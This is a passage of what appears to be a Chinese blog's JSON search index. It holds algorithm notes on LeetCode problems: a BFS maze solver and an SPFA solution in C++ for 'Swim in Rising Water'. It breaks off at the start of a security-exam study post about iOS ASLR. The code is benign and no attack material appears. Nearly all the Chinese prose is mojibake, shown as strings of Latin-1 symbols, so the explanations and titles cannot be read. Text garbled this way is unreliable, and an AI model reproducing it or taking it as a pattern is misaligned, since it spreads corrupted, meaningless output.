æ•°æ®å±‚é¢ï¼Œæˆ‘çœ‹è®¨è®ºåŒºè®²çš„æœ€å¤šçš„æ˜¯intå­˜ä¸ä¸‹çš„å‘ï¼Œå…¶å®è¿™é“é¢˜ä»çœ‹åˆ°æ•°æ®çš„ç¬¬ä¸€çœ¼å¼€å§‹å°±åº”è¯¥é€‰æ‹©ä½¿ç”¨longæˆ–long longï¼Œå¤§ä½¬ä»¬çš„ä½çº§é”™è¯¯å•Š~\nç„¶åæ˜¯ä»ç¬¬0å¤©å¼€å§‹åƒçš„é—®é¢˜ï¼ŒåŠ ç²—ä¹Ÿæ‹¯æ•‘ä¸äº†çœ¼ç\u0026hellip;\nä¹‹å‰WAäº†å‡ æ¬¡ï¼Œè¿˜æ˜¯é€»è¾‘ä¸Šçš„é”™è¯¯ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°favDayè¿™ä¸€å¤©ä¹Ÿæ˜¯èƒ½åƒçš„ï¼Œæ‰€ä»¥æœ€å¤§æ•°é‡å°‘ç®—äº†ä¸€å¤©ï¼›å°±è¿™è¿˜èƒ½è¿‡61/62ï¼Œæµ‹è¯•æ•°æ®æœ‰ç‚¹å¼±ã€‚\nå…³é”®æµ‹è¯•ç»„ï¼š\nInput: [46,5,47,48,43,34,15,26,11,25,41,47,15,25,16,50,32,42,32,21,36,34,50,45,46,15,46,38,50,12,3,26,26,16,23,1,4,48,47,\n32,47,16,33,23,38,2,19,50,6,19,29,3,27,12,6,22,33,28,7,10,12,8,13,24,21,38,43,26,35,18,34,3,14,48,50,34,38,4,50,26,\n5,35,11,2,35,9,11,31,36,20,21,37,18,34,34,10,21,8,5]\n[[85,54,42]]\nOutput: true\n","date":"2021-01-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode5667.-%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E9%82%A3%E5%A4%A9%E5%90%83%E5%88%B0%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%B3%96%E6%9E%9C%E5%90%97/","title":"éš¾é¢˜æœ¬ | LeetCode5667. ä½ èƒ½åœ¨ä½ æœ€å–œæ¬¢çš„é‚£å¤©åƒåˆ°ä½ æœ€å–œæ¬¢çš„ç³–æœå—ï¼Ÿ"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/swim-in-rising-water/\nåˆæ˜¯ä¸€é“ä¸é”™çš„å¤ä¹ é¢˜ï¼Œå€Ÿæ­¤å›é¡¾å›é¡¾BFSå’ŒSPFAã€‚\nBFS Breadth First Searchï¼Œå®½åº¦ä¼˜å…ˆæœç´ ã€‚\nå·²çŸ¥å›¾G = (V, E)å’Œä¸€ä¸ªæºé¡¶ç‚¹sï¼Œå®½åº¦ä¼˜å…ˆæœç´¢ä»¥ä¸€ç§ç³»ç»Ÿçš„æ–¹å¼æ¢å¯»Gçš„è¾¹ï¼Œä»è€Œâ€œå‘ç°â€sæ‰€èƒ½åˆ°è¾¾çš„æ‰€æœ‰é¡¶ç‚¹ï¼Œå¹¶è®¡ç®—såˆ°æ‰€æœ‰è¿™äº›ç‚¹çš„è·ç¦»ï¼ˆæœ€å°‘è¾¹æ•°ï¼‰ã€‚\nä½¿ç”¨ä¸€ä¸ªæ•°ç»„visitedç»´æŠ¤æ¯ä¸ªé¡¶ç‚¹å…ˆå‰æ˜¯å¦è¢«è®¿é—®è¿‡ï¼›ä½¿ç”¨ä¸€ä¸ªæ•°ç»„distç»´æŠ¤æºç‚¹åˆ°æ¯ä¸ªé¡¶ç‚¹çš„è·ç¦»ã€‚visitedåˆå§‹åŒ–ä¸ºå…¨0ï¼Œdiståˆå§‹åŒ–ä¸ºå…¨æ­£æ— ç©·ã€‚\nä½¿ç”¨ä¸€ä¸ªé˜Ÿåˆ—qç»´æŠ¤å½“å‰æ­£åœ¨è®¿é—®çš„ç‚¹ï¼Œæ¯æ¬¡ä»é˜Ÿé¦–ä¸­å–å‡ºheadæ¥è¿›è¡Œæ“ä½œã€‚å¯¹äºheadçš„é‚»æ¥ç‚¹tmpï¼Œè‹¥æˆ‘ä»¬ä¹‹å‰æ²¡æœ‰è®¿é—®è¿‡å®ƒï¼Œåˆ™æºç‚¹åˆ°å®ƒçš„è·ç¦»å°±æ˜¯æºç‚¹åˆ°headçš„è·ç¦»åŠ 1ã€‚æˆ‘ä»¬è®°dist[tmp] = dist[head] + 1ï¼Œç„¶åå°†tmpæ”¾å…¥é˜Ÿåˆ—qä¸­ï¼Œä¹‹åçš„æŸä¸ªæ—¶åˆ»ï¼Œtmpä¼šè¢«å–å‡ºï¼Œç„¶åç»§ç»­æ‰¾å‡ºä¸å®ƒé‚»æ¥ä¸”æ²¡è¢«è®¿é—®è¿‡çš„ç‚¹ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºï¼Œæ‰€æœ‰å¯è¾¾çš„ç‚¹éƒ½è¢«è®¿é—®è¿‡äº†ã€‚\nBFSæœç´¢çš„æ–¹æ³•å°±åƒé‚£è¡å¼€çš„æ¶Ÿæ¼ªï¼Œä»æºç‚¹å¼€å§‹ä¸æ–­å‘å¤–æ‰©å¼ ï¼Œæœ€ç»ˆéå†ç»“æŸï¼Œæ¶Ÿæ¼ªæ¶ˆæ•£ã€‚\nä½¿ç”¨å½“å¹´è¹­HDUæ•°æ®ç»“æ„è¯¾çš„ä¸€é“ä½œä¸šæ¥è¿›è¡ŒBFSçš„å›é¡¾ï¼š\né¢˜ç›®æè¿°\nä¸€ä¸ªè¿·å®«ç”±Rè¡ŒCåˆ—æ ¼å­ç»„æˆï¼Œæœ‰çš„æ ¼å­é‡Œæœ‰éšœç¢ç‰©ï¼Œä¸èƒ½èµ°ï¼›æœ‰çš„æ ¼å­æ˜¯ç©ºåœ°ï¼Œå¯ä»¥èµ°ã€‚ ç»™å®šä¸€ä¸ªè¿·å®«ï¼Œæ±‚ä»å·¦ä¸Šè§’èµ°åˆ°å³ä¸‹è§’æœ€å°‘éœ€è¦èµ°å¤šå°‘æ­¥(æ•°æ®ä¿è¯ä¸€å®šèƒ½èµ°åˆ°)ã€‚åªèƒ½åœ¨æ°´å¹³æ–¹å‘æˆ–å‚ç›´æ–¹å‘èµ°ï¼Œä¸èƒ½æ–œç€èµ°ã€‚\nè¾“å…¥æ ¼å¼\nç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°ï¼Œï¼²å’Œï¼£ï¼Œä»£è¡¨è¿·å®«çš„é•¿å’Œå®½ã€‚ï¼ˆ 1\u0026lt;= Rï¼ŒC \u0026lt;= 40) æ¥ä¸‹æ¥æ˜¯ï¼²è¡Œï¼Œæ¯è¡Œï¼£ä¸ªå­—ç¬¦ï¼Œä»£è¡¨æ•´ä¸ªè¿·å®«ã€‚ ç©ºåœ°æ ¼å­ç”¨\u0026rsquo;.\u0026lsquo;è¡¨ç¤ºï¼Œæœ‰éšœç¢ç‰©çš„æ ¼å­ç”¨\u0026rsquo;#\u0026lsquo;è¡¨ç¤ºã€‚ è¿·å®«å·¦ä¸Šè§’å’Œå³ä¸‹è§’éƒ½æ˜¯\u0026rsquo;.\u0026rsquo;ã€‚\nè¾“å‡ºæ ¼å¼\nè¾“å‡ºä»å·¦ä¸Šè§’èµ°åˆ°å³ä¸‹è§’è‡³å°‘è¦ç»è¿‡å¤šå°‘æ­¥ï¼ˆå³è‡³å°‘è¦ç»è¿‡å¤šå°‘ä¸ªç©ºåœ°æ ¼å­ï¼‰ã€‚è®¡ç®—æ­¥æ•°è¦åŒ…æ‹¬ç»ˆç‚¹,ï¼Œä¸åŒ…æ‹¬èµ·ç‚¹ã€‚å¦‚æœä¸èƒ½åˆ°è¾¾å³ä¸‹è§’ï¼Œè¾“å‡ºâ€œNOâ€.\nè¾“å…¥1ï¼š\n5 5\n..###\n#\u0026hellip;.\n#.#.#\n#.#.#\n#.#..\nè¾“å‡º1ï¼š 8\nè¿™æ˜¯ä¸€é“å®½æœæ¨¡æ¿é¢˜ã€‚ä»æºç‚¹å‡ºå‘ï¼Œå‘å››ä¸ªæ–¹å‘ï¼ˆä¸Šä¸‹å·¦å³ï¼‰æ¢å¯»é‚»æ¥ç‚¹ï¼Œè‹¥é‚»æ¥ç‚¹åˆæ³•ï¼ˆå³æ²¡æœ‰è¶Šç•Œï¼‰ä¸”è¯¥ç‚¹ä¸æ˜¯éšœç¢ï¼ˆ\u0026rsquo;#\u0026rsquo;ï¼‰ä¸”è¯¥ç‚¹æœªè¢«è®¿é—®ï¼Œåˆ™è®°å½•å®ƒåˆ°æºç‚¹çš„è·ç¦»ã€‚\næˆ‘ä¸€ç›´ä¸ä¼šè¯æ˜å®½æœçš„æ­£ç¡®æ€§ï¼Œæ€»è§‰å¾—å®ƒç†æ‰€å½“ç„¶ï¼Œå°±ç›´æ¥æ”¾ä»£ç äº†ï¼š\n#include \u0026lt;queue\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; typedef struct { int x, y; } Point; char graph[44][44]; int visited[44][44]; int dist[44][44]; int R, C; queue\u0026lt;Point\u0026gt; q; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = { {0, 1}, {1, 0}, {0, -1}, {-1, 0} }; void bfs() { Point head; Point tmp; // æºç‚¹å…¥é˜Ÿ tmp.x = tmp.y = 0; visited[0][0] = 1; dist[0][0] = 0; q.push(tmp); // å¼€å§‹å®½æœ while (!q.empty()) { head = q.front(); q.pop(); for (const auto [dirx, diry] : dirs) { tmp.x = head.x + dirx; tmp.y = head.y + diry; if ( 0 \u0026lt;= tmp.x \u0026amp;\u0026amp; tmp.x \u0026lt; R \u0026amp;\u0026amp; 0 \u0026lt;= tmp.y \u0026amp;\u0026amp; tmp.y \u0026lt; C \u0026amp;\u0026amp; graph[tmp.x][tmp.y] != \u0026#39;#\u0026#39; \u0026amp;\u0026amp; !visited[tmp.x][tmp.y] ) { dist[tmp.x][tmp.y] = dist[head.x][head.y] + 1; visited[tmp.x][tmp.y] = 1; q.push(tmp); } } } } int main() { cin \u0026gt;\u0026gt; R \u0026gt;\u0026gt; C; for (int i = 0; i \u0026lt; R; ++i) { for (int j = 0; j \u0026lt; C; ++j) { cin \u0026gt;\u0026gt; graph[i][j]; dist[i][j] = 0xffff; } } bfs(); if (dist[R - 1][C - 1] != 0xffff) { cout \u0026lt;\u0026lt; dist[R - 1][C - 1] \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;NO\\n\u0026#34;; } return 0; } SPFA ç»ˆäºæ¥åˆ°äº†æ­£é¢˜ã€‚\nSPFAæ˜¯æ±‚å•æºæœ€çŸ­è·¯å¾„çš„ä¸€ç§ç®—æ³•ï¼Œå…¶æ€æƒ³ä¸å®½æœååˆ†ç›¸è¿‘ã€‚å®é™…ä¸Šï¼Œæˆ‘å½“å¹´åœ¨å®Œå…¨æ²¡æœ‰æ¥è§¦æ­¤ç®—æ³•çš„æƒ…å†µä¸‹ç‹¬ç«‹åœ°å°†å®½æœæ”¹å†™ä¸ºäº†ä¸€ä¸ªç²—ç³™çš„SPFAï¼Œç”¨å®ƒé€šè¿‡äº†ä¸€äº›æ±‚æœ€çŸ­è·¯çš„é¢˜ç›®ã€‚ç”±æ­¤å¯è§ï¼Œåœ¨ç†è§£å®½æœçš„å‰æä¸‹ç†è§£SPFAæ˜¯æ¯”è¾ƒç®€å•çš„ã€‚\nå¤§æ¦‚è¿˜æ˜¯éœ€è¦è®¨è®ºè®¨è®ºBFSçš„æ­£ç¡®æ€§ï¼šæˆ‘ä»¬å°†å½“å‰èŠ‚ç‚¹çš„é‚»æ¥èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—ï¼Œç”±äºå½“å‰èŠ‚ç‚¹åˆ°æºèŠ‚ç‚¹æœ€çŸ­ï¼Œåˆ™å…¶é‚»æ¥èŠ‚ç‚¹åˆ°æºèŠ‚ç‚¹ä¹Ÿæœ€çŸ­ã€‚\nä½†æ˜¯ï¼ŒBFSçš„â€œè·ç¦»â€å®é™…ä¸Šæ˜¯æŒ‡æºèŠ‚ç‚¹åˆ°å½“å‰èŠ‚ç‚¹çš„â€œè·³æ•°â€ï¼Œä¹Ÿå°±æ˜¯ä»æºèŠ‚ç‚¹å‡ºå‘éœ€è¦ç»è¿‡å‡ ä¸ªèŠ‚ç‚¹æ‰èƒ½åˆ°è¾¾å½“å‰èŠ‚ç‚¹ã€‚è¿™åœ¨ä¸€ä¸ªå¸¦æƒå›¾ä¸­æ˜¯ä¸é€‚ç”¨çš„ã€‚è€ƒè™‘ä»¥ä¸‹æƒ…å†µï¼š\nBFSåœ¨å¸¦æƒå›¾ä¸­ä¸é€‚ç”¨ æˆ‘ä»¬ä»æºç‚¹Aå‡ºå‘ï¼Œåˆ°è¾¾ç‚¹Eï¼Œä½¿ç”¨BFSæ—¶ï¼Œæƒ…å†µå¦‚ä¸‹ï¼š\né˜Ÿåˆ—åˆå§‹åªæœ‰ç‚¹Aï¼Œdist[B] ~ dist[E]éƒ½æ˜¯æ­£æ— ç©·ï¼Œvisited[B] ~ visited[E]éƒ½æ˜¯0ï¼› ç‚¹Aå‡ºé˜Ÿï¼Œè€ƒè™‘å…¶æ‰€æœ‰é‚»æ¥ç‚¹Bã€Cã€Dï¼Œè®¾ç½®dist[B] = 5; dist[C] = 3; dist[D] = 7ï¼Œå¹¶é€ä¸€å…¥é˜Ÿï¼Œç°åœ¨é˜Ÿåˆ—ä¸­æœ‰B/C/Dï¼› ç‚¹Bå‡ºé˜Ÿï¼Œè€ƒè™‘å…¶æ‰€æœ‰é‚»æ¥ç‚¹Eï¼Œè®¾ç½®dist[E] = dist[B] + edge[B][E] = 11;ï¼Œå°†Eå…¥é˜Ÿï¼Œç°åœ¨é˜Ÿåˆ—ä¸­æœ‰C/D/Eï¼› ç‚¹Cå‡ºé˜Ÿï¼Œè€ƒè™‘å…¶æ‰€æœ‰é‚»æ¥ç‚¹Eï¼Œç”±äºvisited[E] = 1ï¼Œä¸å†è¿›è¡Œæ›´æ–°ï¼› ç‚¹Då‡ºé˜Ÿï¼Œæ²¡æœ‰é‚»æ¥ç‚¹ï¼› ç‚¹Eå‡ºé˜Ÿï¼Œæ²¡æœ‰é‚»æ¥ç‚¹ï¼› ç»“æŸã€‚ å¯ä»¥çœ‹åˆ°ï¼Œç”±BFSæœ€çŸ­è·³æ•°å¾—åˆ°çš„å¸¦æƒè·ç¦»å¹¶ä¸ä¸€å®šæ˜¯æœ€çŸ­çš„ï¼Œè€Œè¿™ä¸»è¦æ˜¯ç”±äºè¾¹æƒå…·å¤‡ä»»æ„æ€§ã€‚å®é™…ä¸Šï¼Œä¾‹å¦‚åœ¨è®¡ç®—æœºç½‘ç»œä¸­è¿›è¡Œè·¯ç”±é€‰è·¯æ—¶ï¼Œè·¯ç”±è·³æ•°æœ€å°‘çš„é‚£æ¡è·¯çº¿ä¹Ÿæœªå¿…æ˜¯æ—¶å»¶æœ€ä½çš„ï¼Œä¸æ­¤ä¾‹æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚\nåœ¨ä¸Šé¢çš„åˆ†æä¸­ï¼Œç”±visitedå¸¦æ¥çš„å½±å“èƒ½å¦æ¶ˆé™¤å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚æ—¢ç„¶å¯èƒ½å‡ºç°è·³æ•°æ›´å¤šä½†æƒå’Œæ›´çŸ­çš„è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è®¿é—®ç‚¹Eçš„æ—¶å€™è€ƒè™‘å…¶dist[E]å’Œdist[C] + edge[C][E]çš„å¤§å°ï¼Œä»¤å…¶ç­‰äºæ›´å°çš„é‚£ä¸€ä¸ªä¸å°±å¯ä»¥äº†å—ï¼Ÿ\nåœ¨æœ¬ä¾‹ä¸­ï¼Œè¿™æ ·åšç¡®å®å¯ä»¥ã€‚å½“ç‚¹Cå‡ºé˜Ÿæ—¶è€ƒè™‘å…¶é‚»æ¥ç‚¹Eï¼Œç”±äºdist[E] \u0026gt; dist[C] + edge[C][E]ï¼Œæˆ‘ä»¬å°†dist[E]çš„å€¼æ›´æ–°ä¸ºåè€…ï¼Œå³Aåˆ°Eçš„æœ€çŸ­è·ç¦»ä¸º7ã€‚\nä½†æ˜¯ï¼Œåœ¨ä¸€ä¸ªæ›´åŠ å¤æ‚çš„å›¾ä¸­ï¼Œè¿™æ ·åšå°±ä¸å®Œå…¨æ­£ç¡®äº†ã€‚è€ƒè™‘è¿™ä¸ªæœ‰å‘å›¾ï¼š\næœ‰å‘å›¾ å½“æˆ‘ä»¬ç»è¿‡äº†å¾ˆå¤šè·³ä¹‹åç»ˆäºæ‰¾åˆ°äº†ä¸€ä¸ªåˆ°è¾¾ç‚¹Cçš„æ›´çŸ­è·¯å¾„ï¼ˆA-\u0026gt;B-\u0026gt;D-\u0026gt;F-\u0026gt;G-\u0026gt;C)ï¼Œå‘ç°å®ƒçš„é‚»æ¥ç‚¹Eæ—©åœ¨ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å°±å·²ç»ç”¨è·¯å¾„A-\u0026gt;C-\u0026gt;Eæ¥è®¡ç®—è·ç¦»äº†ã€‚\nå…µæ¥å°†æŒ¡ï¼Œæ°´æ¥åœŸæ©ã€‚æ—¢ç„¶æˆ‘ä½¿ç”¨æ›´å°çš„è·ç¦»æ¥æ›´æ–°æŸä¸ªç‚¹æ—¶ï¼Œå®ƒçš„é‚»æ¥ç‚¹å¯èƒ½æ— æ³•å¾—åˆ°æ›´æ–°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¹²è„†è®©å®ƒå†æ¬¡è¿›å…¥é˜Ÿåˆ—ä¸­ï¼Œè¿™æ ·ä¹‹åå®ƒä»é˜Ÿåˆ—ä¸­è¢«å–å‡ºæ—¶å°†ä¼šé‡æ–°æ›´æ–°æ‰€æœ‰é‚»æ¥ç‚¹ï¼›åŒç†ï¼Œè¢«æ›´æ–°çš„é‚»æ¥ç‚¹å†æ¬¡è¿›å…¥é˜Ÿåˆ—ä¸­ï¼Œå»æ›´æ–°é‚»æ¥ç‚¹çš„é‚»æ¥ç‚¹\u0026hellip;\u0026hellip;\næ²¡é”™ï¼ŒSPFAå°±æ˜¯å¦‚æ­¤ï¼Œä¸”åªæœ‰å¦‚æ­¤ã€‚\nå›é¡¾ä¸€ä¸‹è¯´äº†ä»€ä¹ˆï¼š\nä¿®æ”¹BFSä¸­çš„è·ç¦»æ›´æ–°æ¡ä»¶ï¼Œä¸ç”¨visitedä½œä¸ºåˆ¤æ–­æ ‡å‡†ï¼Œè€Œç”¨distä½œä¸ºåˆ¤æ–­æ ‡å‡†ï¼Œåªè¦distæ›´å°ï¼Œå°±å¯¹å…¶è¿›è¡Œæ›´æ–°ï¼› æ¯æ¬¡æ›´æ–°äº†æŸä¸ªç‚¹çš„distï¼ŒæŠŠå®ƒé‡æ–°å…¥é˜Ÿï¼Œè¿™æ ·å°±èƒ½æ›´æ–°å®ƒçš„é‚»æ¥ç‚¹ã€‚ é‚£ä¹ˆï¼Œvisitedæ•°ç»„å°±è¿˜æ˜¯æœ‰ç”¨çš„ï¼šæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨visitedæ¥ä¿å­˜è®¿é—®è¿‡çš„ç‚¹ï¼ŒBFSè¿‡ç¨‹ä¸­é‡åˆ°è®¿é—®è¿‡çš„ç‚¹å°±ä¸å†è®¿é—®äº†ï¼›ç°åœ¨å¯ä»¥ä½¿ç”¨visitedæ¥ä¿å­˜ä¸€ä¸ªç‚¹æ˜¯å¦å­˜åœ¨é˜Ÿåˆ—ä¸­ï¼Œè‹¥æ˜¯ï¼Œæˆ‘ä»¬æ›´æ–°å®ƒçš„distçš„æ—¶å€™å°±ä¸ç”¨å…¥é˜Ÿï¼Œå› ä¸ºå®ƒæœ¬æ¥å°±åœ¨é˜Ÿåˆ—é‡Œé¢ã€‚é‡‡ç”¨è¿™ä¸ªåŠæ³•ï¼Œæ¯æ¬¡ä¸€ä¸ªç‚¹å‡ºé˜Ÿçš„æ—¶å€™å°±å°†å¯¹åº”çš„visitedè®¾ç½®ä¸º0ï¼Œä¸ºå…¶æä¾›å†æ¬¡å…¥é˜Ÿçš„å¯èƒ½æ€§ã€‚\nè¯´äº†é‚£ä¹ˆå¤šï¼Œçœ‹çœ‹LeetCode778. æ°´ä½ä¸Šå‡çš„æ³³æ± ä¸­æ¸¸æ³³:\nåœ¨ä¸€ä¸ª N x N çš„åæ ‡æ–¹æ ¼ grid ä¸­ï¼Œæ¯ä¸€ä¸ªæ–¹æ ¼çš„å€¼ grid[i][j] è¡¨ç¤ºåœ¨ä½ç½®(i,j)çš„å¹³å°é«˜åº¦ã€‚\nç°åœ¨å¼€å§‹ä¸‹é›¨äº†ã€‚å½“æ—¶é—´ä¸ºtæ—¶ï¼Œæ­¤æ—¶é›¨æ°´å¯¼è‡´æ°´æ± ä¸­ä»»æ„ä½ç½®çš„æ°´ä½ä¸ºtã€‚ä½ å¯ä»¥ä»ä¸€ä¸ªå¹³å°æ¸¸å‘å››å‘¨ç›¸é‚»çš„ä»»æ„ä¸€ä¸ªå¹³å°ï¼Œä½†æ˜¯å‰ææ˜¯æ­¤æ—¶æ°´ä½å¿…é¡»åŒæ—¶æ·¹æ²¡è¿™ä¸¤ä¸ªå¹³å°ã€‚å‡å®šä½ å¯ä»¥ç¬é—´ç§»åŠ¨æ— é™è·ç¦»ï¼Œä¹Ÿå°±æ˜¯é»˜è®¤åœ¨æ–¹æ ¼å†…éƒ¨æ¸¸åŠ¨æ˜¯ä¸è€—æ—¶çš„ã€‚å½“ç„¶ï¼Œåœ¨ä½ æ¸¸æ³³çš„æ—¶å€™ä½ å¿…é¡»å¾…åœ¨åæ ‡æ–¹æ ¼é‡Œé¢ã€‚\nä½ ä»åæ ‡æ–¹æ ¼çš„å·¦ä¸Šå¹³å° (0ï¼Œ0) å‡ºå‘ã€‚æœ€å°‘è€—æ—¶å¤šä¹…ä½ æ‰èƒ½åˆ°è¾¾åæ ‡æ–¹æ ¼çš„å³ä¸‹å¹³å° (N-1, N-1)ï¼Ÿ\nç¤ºä¾‹1\nè¾“å…¥: [[0,2],[1,3]]\nè¾“å‡º: 3\nè§£é‡Š: æ—¶é—´ä¸º0æ—¶ï¼Œä½ ä½äºåæ ‡æ–¹æ ¼çš„ä½ç½®ä¸º (0, 0)ã€‚ æ­¤æ—¶ä½ ä¸èƒ½æ¸¸å‘ä»»æ„æ–¹å‘ï¼Œå› ä¸ºå››ä¸ªç›¸é‚»æ–¹å‘å¹³å°çš„é«˜åº¦éƒ½å¤§äºå½“å‰æ—¶é—´ä¸º 0 æ—¶çš„æ°´ä½ã€‚\nç­‰æ—¶é—´åˆ°è¾¾ 3 æ—¶ï¼Œä½ æ‰å¯ä»¥æ¸¸å‘å¹³å° (1, 1). å› ä¸ºæ­¤æ—¶çš„æ°´ä½æ˜¯ 3ï¼Œåæ ‡æ–¹æ ¼ä¸­çš„å¹³å°æ²¡æœ‰æ¯”æ°´ä½ 3 æ›´é«˜çš„ï¼Œæ‰€ä»¥ä½ å¯ä»¥æ¸¸å‘åæ ‡æ–¹æ ¼ä¸­çš„ä»»æ„ä½ç½®\nè¿™é“é¢˜å¯ä»¥ä½¿ç”¨å˜ç›¸çš„SPFAæ¥è§£å†³ã€‚æˆ‘ä»¬çš„distä¸å†æ˜¯æºç‚¹åˆ°ä»»ä¸€ç‚¹çš„è·ç¦»ï¼Œè€Œæ˜¯æºç‚¹åˆ°è¾¾ä»»ä¸€ç‚¹æ‰€éœ€è¦çš„æ—¶é—´ã€‚å¯¹äºä¸€ä¸ªç‚¹çš„é‚»æ¥ç‚¹ï¼Œå¦‚æœè‡ªå·±çš„é«˜åº¦æ¯”å®ƒé«˜ï¼Œåˆ™è¯´æ˜æˆ‘ä»¬åˆ°è¾¾å½“å‰è¿™ä¸ªç‚¹çš„æ—¶å€™ï¼Œæ°´é¢å·²ç»æ²¡è¿‡äº†è¿™ä¸ªé‚»æ¥ç‚¹ï¼›å¦‚æœè‡ªå·±çš„é«˜åº¦æ¯”å®ƒä½ï¼Œè¯´æ˜æˆ‘ä»¬åˆ°è¾¾å½“å‰è¿™ä¸ªç‚¹çš„æ—¶å€™è¿˜æ²¡åŠæ³•åˆ°è¾¾é‚»æ¥ç‚¹ï¼Œå› ä¸ºè‡³å°‘éœ€è¦ç­‰å¾…æ°´é¢æ²¡è¿‡å®ƒï¼›æ‰€ä»¥é‡‡ç”¨å½“å‰è¿™æ¡è·¯å¾„ï¼Œè¦åˆ°è¾¾è¿™ä¸ªé‚»æ¥ç‚¹çš„æ—¶é—´å°±æ˜¯max(grid[tmp.x][tmp.y], distance[head.x][head.y])ã€‚\né‚£ä¹ˆæ ¹æ®SPFAçš„é€»è¾‘ï¼Œå°±èƒ½å¾—åˆ°å¦‚ä¸‹çš„ä»£ç ï¼š\nclass Solution { public: typedef struct { int x, y; } Point; int swimInWater(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; grid) { const int n = grid.size(); int visited[51][51] = { 0 }; int distance[51][51]; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) { distance[i][j] = n * n; } } // SPFA queue\u0026lt;Point\u0026gt; q; Point head; Point tmp; tmp.x = tmp.y = 0; distance[0][0] = grid[0][0]; q.push(tmp); visited[0][0] = 1; while (!q.empty()) { head = q.front(); q.pop(); visited[head.x][head.y] = 0; // æä¾›å†æ¬¡å…¥é˜Ÿçš„å¯èƒ½æ€§ for (const auto [dirx, diry] : dirs) // å¯¹äºæ‰€æœ‰é‚»æ¥ç‚¹ { tmp.x = head.x + dirx; tmp.y = head.y + diry; if ( (0 \u0026lt;= tmp.x \u0026amp;\u0026amp; tmp.x \u0026lt; n) \u0026amp;\u0026amp; (0 \u0026lt;= tmp.y \u0026amp;\u0026amp; tmp.y \u0026lt; n) \u0026amp;\u0026amp; distance[tmp.x][tmp.y] \u0026gt; max(grid[tmp.x][tmp.y], distance[head.x][head.y]) ) { distance[tmp.x][tmp.y] = max(grid[tmp.x][tmp.y], distance[head.x][head.y]); if (!visited[tmp.x][tmp.y]) { q.push(tmp); visited[tmp.x][tmp.y] = 1; } } } } return distance[n - 1][n - 1]; } }; è¡¨ç°ä¸€èˆ¬ï¼Œä¸»è¦æ˜¯ç”±äºSPFAç®—æ³•åœ¨ç¨€ç–å›¾çš„æƒ…å†µä¸‹è¡¨ç°æ›´å¥½ï¼Œåœ¨è¿™ç§ç¨ å¯†å›¾ä¸­æ—¶é—´å¤æ‚åº¦é€€åŒ–äº†ã€‚\nPerformance è¿™é¢˜å®é™…ä¸Šè¿˜æ˜¯ä½¿ç”¨Dijkstraç®—æ³•ä¼šå¥½ä¸€äº›ï¼Œå®˜æ–¹è¿˜æä¾›äº†äºŒåˆ†ç­”æ¡ˆï¼ˆæ€è·¯ç®€å•ï¼ï¼‰ã€å¹¶æŸ¥é›†ç­‰éªšæ“ä½œï¼Œä¸åœ¨æœ¬æ–‡çš„è®¨è®ºèŒƒå›´å†…ã€‚\nå‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.æ°´ä½ä¸Šå‡çš„æ³³æ± ä¸­æ¸¸æ³³[EB/OL].2021-01-30\nhttps://leetcode-cn.com/problems/swim-in-rising-water/solution/shui-wei-shang-sheng-de-yong-chi-zhong-y-xm9i/\n[2] SHHHS.SPFAç®—æ³•[EB/OL].2016-09-14\nhttps://www.cnblogs.com/shadowland/p/5870640.html\n[3] 360ç™¾ç§‘.å®½åº¦ä¼˜å…ˆæœç´¢[EB/OL]\nhttps://baike.so.com/doc/7806949-8081044.html\n","date":"2021-01-30T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode778.-%E6%B0%B4%E4%BD%8D%E4%B8%8A%E5%8D%87%E7%9A%84%E6%B3%B3%E6%B1%A0%E4%B8%AD%E6%B8%B8%E6%B3%B3/","title":"éš¾é¢˜æœ¬ | LeetCode778. æ°´ä½ä¸Šå‡çš„æ³³æ± ä¸­æ¸¸æ³³"},{"content":"\u003c!doctype html\u003e \u0026quot;å®‰å…¨å²—ç¬”è¯•é¢˜â€”â€”1\u0026quot; è¿‘æœŸå‡†å¤‡å®‰å…¨å²—å®ä¹ çš„ç¬”è¯•ï¼Œç»“æœæ‚²ä¼¤åœ°è¯å®äº†æˆ‘çš„çŸ¥è¯†ä½“ç³»ä¸­è¿˜æ˜¯å­˜åœ¨å¾ˆå¤šæ¼æ´ï¼Œåœ¨æ­¤å¯¹æˆ‘ä¸å¤Ÿç†Ÿæ‚‰çš„é¢˜ç›®è¿›è¡Œè®°å½•ã€‚\nä»¥ä¸‹å“ªäº›è¯´æ³•æ˜¯æ­£ç¡®çš„ï¼Ÿï¼ˆï¼‰\nAã€ iOSç³»ç»Ÿä»iOS6å¼€å§‹å¼•å…¥kernel ASLRå®‰å…¨æªæ–½\nBã€ ä¸»æµçš„iPhoneæ‰‹æœºå†…ç½®äº†AESå’ŒRSAç¡¬ä»¶åŠ é€Ÿè§£å¯†å¼•æ“\nCã€ å®‰å“ç³»ç»Ÿé‡‡ç”¨äº†å®‰å…¨å¼•å¯¼é“¾ï¼ˆSecureboot 